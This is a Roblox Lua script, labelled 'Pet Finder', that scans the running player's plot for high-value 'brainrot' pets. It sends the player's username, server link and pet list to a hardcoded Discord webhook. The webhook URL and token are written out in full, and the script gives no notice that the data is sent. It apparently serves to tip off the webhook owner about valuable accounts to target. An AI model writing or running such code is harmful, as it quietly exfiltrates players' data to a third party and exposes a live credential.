-- 🌐 Sistema de envío webhook MEJORADO con clasificación por valor
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local LP = Players.LocalPlayer

local function horaMexico()
	local time = os.time()
	local mexicoOffset = -6 * 3600 -- UTC-6
	local localTime = os.date("!*t", time + mexicoOffset)
	return string.format("%04d-%02d-%02d %02d:%02d:%02d", localTime.year, localTime.month, localTime.day, localTime.hour, localTime.min, localTime.sec)
end

-- 🧠 Extraer datos de Brainrots y detectar valores (solo los que contienen M/s o K/s)
local function getBrainrotData(plot)
	local resultsMS = {}
	local resultsKS = {}
	if not plot then return {}, {} end

	local animalPodiums = plot:FindFirstChild("AnimalPodiums")
	if not animalPodiums then return {}, {} end

	for _, folder in ipairs(animalPodiums:GetChildren()) do
		local displayText, genText, mutationText = "N/A", "N/A", "N/A"

		for _, descendant in ipairs(folder:GetDescendants()) do
			if descendant:IsA("TextLabel") then
				local name = string.lower(descendant.Name)
				if name:find("display") then
					displayText = descendant.Text
				elseif name:find("generation") then
					genText = descendant.Text
				elseif name:find("mutation") then
					mutationText = descendant.Text
				end
			end
		end

		local genLower = string.lower(genText)
		local fullText = displayText .. " - " .. genText .. " - " .. mutationText

		if string.find(genLower, "m/s") then
			table.insert(resultsMS, fullText)
		elseif string.find(genLower, "k/s") then
			table.insert(resultsKS, fullText)
		end
	end

	return resultsMS, resultsKS
end

-- 🎯 Buscar el plot del jugador
local function findMyPlot()
	local plotsFolder = workspace:FindFirstChild("Plots")
	if not plotsFolder then return nil end

	for _, plot in pairs(plotsFolder:GetChildren()) do
		local plotSign = plot:FindFirstChild("Plotsign") or plot:FindFirstChild("PlotSign")
		if plotSign then
			local surfaceGui = plotSign:FindFirstChild("SurfaceGui")
			if surfaceGui then
				local frame = surfaceGui:FindFirstChild("Frame")
				if frame then
					local textLabel = frame:FindFirstChild("TextLabel")
					if textLabel and textLabel:IsA("TextLabel") then
						if string.find(string.lower(textLabel.Text), string.lower(LP.Name)) then
							return plot
						end
					end
				end
			end
		end
	end
	return nil
end

-- 🚀 Enviar información al Webhook según el tipo
local function sendToWebhook(url, data, brainrotList, plotInfo, category)
	local brainrotText = table.concat(brainrotList, "\n")
	
	local categoryTitle = ""
	local categoryColor = 65280
	
	if category == "MS" then
		categoryTitle = "🟣 BRAINROTS CON M/s DETECTADOS"
		categoryColor = 10181046  -- Morado
	elseif category == "KS" then
		categoryTitle = "🟡 BRAINROTS CON K/s DETECTADOS"
		categoryColor = 16776960  -- Amarillo
	end

	local embedData = {
		content = "🔔 **" .. categoryTitle .. "**",
		embeds = {{
			title = categoryTitle,
			color = categoryColor,
			fields = {
				{
					name = "👤 Usuario",
					value = "`"..LP.Name.."`",
					inline = true
				},
				{
					name = "🌐 Server Link",
					value = tostring(data.url),
					inline = true
				},
				{
					name = "📊 Información del Plot",
					value = plotInfo,
					inline = false
				},
				{
					name = "🧠 Brainrots Detectados",
					value = "```" .. brainrotText .. "```",
					inline = false
				},
				{
					name = "📈 Total Brainrots",
					value = "```".. tostring(#brainrotList).. "```",
					inline = true
				},
				{
					name = "🎯 Tipo Detectado",
					value = category == "MS" and "🟣 M/s (ALTO VALOR)" or "🟡 K/s (VALOR MEDIO)",
					inline = true
				},
				{
					name = "🕒 Fecha/Hora (México)",
					value = horaMexico(),
					inline = true
				}
			},
			footer = {
				text = "🐾 Pet Finder | Sistema de clasificación por valor"
			}
		}}
	}

	local success, response = pcall(function()
		return HttpService:RequestAsync({
			Url = url,
			Method = "POST",
			Headers = {["Content-Type"] = "application/json"},
			Body = HttpService:JSONEncode(embedData)
		})
	end)

	if success then
		print("🟢 success")
		print("🟡 Categoría: " .. category)
	else
		warn("❌ Error al enviar webhook " .. url .. ": " .. tostring(response))
	end
end

-- 🔔 Función mejorada para enviar a webhooks específicos según el tipo
local function sendToSpecificWebhooks(data)
    local myPlot = findMyPlot()
    if not myPlot then 
        warn("❌ No se pudo encontrar el plot del jugador")
        return 
    end
    
    local resultsMS, resultsKS = getBrainrotData(myPlot)
    local plotInfo = "Plot encontrado: " .. myPlot.Name

    -- 📋 WEBHOOKS ESPECÍFICOS
    local webhookMS = "https://discord.com/api/webhooks/1427469908098285639/g2Sb-0AhgAUsIK1313JOoCcOIwVsSr7v5bFm3xq36U6dc8UJUiIgaxHibwxrgM18RkHA"
    local webhookKS = "https://discord.com/api/webhooks/1427469908098285639/g2Sb-0AhgAUsIK1313JOoCcOIwVsSr7v5bFm3xq36U6dc8UJUiIgaxHibwxrgM18RkHA"

    -- Solo enviar si hay datos válidos
    if #resultsMS > 0 then
        sendToWebhook(webhookMS, data, resultsMS, plotInfo, "MS")
    else
        print("ℹ️ No se encontraron brainrots con M/s")
    end
    
    if #resultsKS > 0 then
        sendToWebhook(webhookKS, data, resultsKS, plotInfo, "KS")
    else
        print("ℹ️ No se encontraron brainrots con K/s")
    end
end

-- 🔔 Función principal para enviar webhooks
local function sendToMultipleWebhooks(data)
    task.spawn(function()
        sendToSpecificWebhooks(data)
    end)
end

-- 🎮 EJECUCIÓN PRINCIPAL (reemplaza 'txt' con tu URL del servidor)
local txt = "https://www.roblox.com/games/your-game-id/your-game-name"
local webhookData = {
    url = txt
}
sendToMultipleWebhooks(webhookData)
